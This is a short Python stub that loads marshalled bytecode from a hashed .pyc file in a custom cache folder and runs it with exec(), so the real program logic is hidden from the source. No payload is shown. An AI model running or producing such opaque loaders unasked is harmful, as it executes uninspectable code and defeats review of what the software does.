
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'auxiliary_ef00398439f748279b074cd06b20e8ab.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
